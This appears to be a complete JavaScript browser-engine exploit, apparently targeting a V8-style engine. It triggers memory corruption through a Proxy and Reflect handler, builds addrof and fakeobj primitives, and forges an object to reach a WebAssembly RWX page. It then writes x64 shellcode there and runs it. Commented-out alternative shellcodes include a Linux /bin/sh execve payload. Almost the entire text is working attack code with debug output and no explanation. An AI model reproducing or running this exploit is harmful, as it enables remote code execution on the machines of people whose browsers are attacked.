//for(var i=0; i<((1024*1024*2)/0x10); i++)
//{
//	var a = new String();
//}


callFn = function (code) { try { code(); } catch (e) { console.log(e); } }

let proxy = new Proxy({}, {});
function run(prop, ...args) {
	let handler = {};
	const proxy = new Proxy(function(){}, handler);
	handler[prop] = (({v1 = ((v2 = (function () {
		var v3 = 0;
		var callFn = 0;
		if(a){return;}else{return;}
		(function () { v3(); });
		(function () {
			callFn = "\u0041".repeat(1024*32);
			v3 = [1.1];
			v4 = [{}].slice();
			//%DebugPrint(v3);
			//%DebugPrint(v4);
		})
		})) => (1))() }, ...args) => (1));
	Reflect[prop](proxy, ...args);
}
callFn((() => (run("construct", []))));
callFn((() => (run("prop1"))));
function test() {
	run[0x10] = 0x12121212;
	console.log(proxy.length);
	if(proxy.length==1){
		location.reload();
		quit();
	}
	
	let convert = new ArrayBuffer(0x8);
	let f64 = new Float64Array(convert);
	let u32 = new Uint32Array(convert);

	function d2u(v) { f64[0] = v; return u32;}
	function u2d(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0];}
	function hex(d) { let val = d2u(d); return ("0x" + (val[1] * 0x100000000 + val[0]).toString(16)); }


	let shellcode = [0x488bc448, 0x89580848, 0x89701048, 0x89781855, 0x488d68a1, 0x4881ecb0, 0xc7, 0x45c77573, 0x6572c745, 0xcb33322e, 0x6466c745, 0xcf6c6cc6, 0x45d100c7, 0x45f74865, 0x6c6cc745, 0xfb6f2077, 0x6fc745ff, 0x726c6400, 0xc745d743, 0x3a5c57c7, 0x45db696e, 0x646f66c7, 0x45df7773, 0xc645e100, 0xc745e75c, 0x537973c7, 0x45eb7465, 0x6d3366c7, 0x45ef325c, 0xc645f100, 0xc745076e, 0x6f7465c7, 0x450b7061, 0x642ec745, 0xf657865, 0xe8da00, 0xba8e, 0x4e0eec48, 0x8bc8488b, 0xf8e85201, 0x488d, 0x4dc7ffd0, 0xba7ed8e2, 0x73488bcf, 0x488bd8e8, 0x3c010000, 0xba98fe8a, 0xe488bcf, 0x488bf0e8, 0x2c010000, 0xbaa8a24d, 0xbc488bcb, 0x488bf8e8, 0x1c010000, 0x4533c948, 0x8d55f745, 0x33c033c9, 0xffd0488d, 0x55d7c645, 0x1700488d, 0x4d17e859, 0x48, 0x8d55e748, 0x8d4d17e8, 0x4c000000, 0x488d5507, 0x488d4d17, 0xe83f0000, 0xba0500, 0x488d, 0x4d17ffd7, 0x33c9ffd6, 0x4c8d9c24, 0xb0000000, 0x498b5b10, 0x498b7318, 0x498b7b20, 0x498be35d, 0xc3cccccc, 0x33c03801, 0x740a48ff, 0xc1ffc080, 0x390075f6, 0xc3cccccc, 0xeb0348ff, 0xc1803900, 0x75f8482b, 0xca8a0288, 0x41148ff, 0xc284c075, 0xf4c3cccc, 0x4883ec28, 0xe8ff0000, 0x488b48, 0x184c8b51, 0x204d8bda, 0x498b4a50, 0xe8230000, 0x3d3fd6, 0xec8f7413, 0x4d8b124d, 0x85d27405, 0x4d3bd375, 0xe34883c8, 0xffeb0449, 0x8b422048, 0x83c428c3, 0x4533c941, 0x8bd1eb1b, 0x440fb7c0, 0x488d4902, 0x418d40bf, 0x83f81977, 0x44183c0, 0x20c1ca0d, 0x4103d00f, 0xb7016685, 0xc075dd8b, 0xc2c3cccc, 0x33c0eb0b, 0xfbed248, 0xffc1c1c8, 0xd03c28a, 0x1184d275, 0xefc3cccc, 0x48895c24, 0x8488974, 0x24105748, 0x83ec2048, 0x63413c45, 0x33c98bf2, 0x4c8bd144, 0x8b840888, 0x4c, 0x3c1458b, 0x5820418b, 0x581c4c03, 0xd9418b78, 0x244803d9, 0x458b4018, 0x4803f945, 0x85c0741b, 0x418b0b49, 0x3cae899, 0xffffff3b, 0xf0741e41, 0xffc14983, 0xc304453b, 0xc872e533, 0xc0488b5c, 0x2430488b, 0x74243848, 0x83c4205f, 0xc3420fb7, 0xc4f8b04, 0x8b4903c2, 0xebe3cccc, 0x65488b04, 0x25600000, 0xc30000];
	//let shellcode = [0x9965488b, 0x4260488b, 0x4018488b, 0x701048ad, 0x488b3048, 0x8b7e3048, 0x31db4831, 0xf68b5f3c, 0x4801fbb2, 0x888b1c13, 0x4801fb8b, 0x731c4801, 0xfe9966ba, 0x27058b04, 0x964801f8, 0xeb175999, 0x48ffc2ff, 0xd09966ba, 0x29018b04, 0x964801f8, 0x4831c9ff, 0xd0e8e4ff, 0xffff636d, 0x64000000]
	//let shellcode = [0x6a6848b8, 0x2f62696e, 0x2f2f2f73, 0x504889e7, 0x68726901, 0x1813424, 0x1010101, 0x31f656be, 0x1010101, 0x81f60901, 0x1014801, 0xe6564889, 0xe631d2b8, 0x01010101, 0x353a0101, 0x01900f05];
	//let shellcode = [0xbb48c031, 0x91969dd1, 0xff978cd0, 0x53dbf748, 0x52995f54, 0xb05e5457, 0x50f3b];
	let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105, 0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11]);
	let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
	let f = wasm_mod.exports._Z3addii;
	
	console.log("[+] arr1[0] : "+proxy[0])
	console.log("[+] arr2[0] : "+hex(proxy[0x18]))
	arr2Map = proxy[4]
	var arr1Map = arr2Map - 0.000000000007900e-310
	console.log("[+] arr1Map : " + hex(arr1Map))
	console.log("[+] arr2Map : " + hex(arr2Map))

	//alert("success");

	let addrof = function(obj) {
		v4[0] = obj;
		return proxy[0x18];		// return arr2[0];
	}

	let fakeobj = function(addr) {
		proxy[0x18] = addr
		return v4[0]
	}

	let ab = new ArrayBuffer(0x300);
	let abAddr = addrof(ab);
	//%DebugPrint(ab);
	console.log("[+] array_buf : "+hex(abAddr));
	let wasmObj = addrof(wasm_mod) + u2d(0xe8-0x10,0);
	console.log("[+] wasm_addr : "+hex(addrof(wasmObj)))

	var fake = [ arr1Map, 0, wasmObj, u2d(0,0x8) ].slice();
	var fakeAddr = addrof(fake) - u2d(0x20,0);
	var target = fakeobj(fakeAddr);
	console.log("[+] fake_addr : " + hex(fakeAddr));

	let rwx = target[0];
	console.log("[+] rwx : " + hex(rwx));
	fake[2] = abAddr + u2d(0x10, 0);
	target[0] = rwx;

	let dv = new DataView(ab);
	for (var i = 0; i < shellcode.length; i++) {
		dv.setUint32(i*4, shellcode[i]);
	}
	//%DebugPrint(f);
	f();	
}

test();
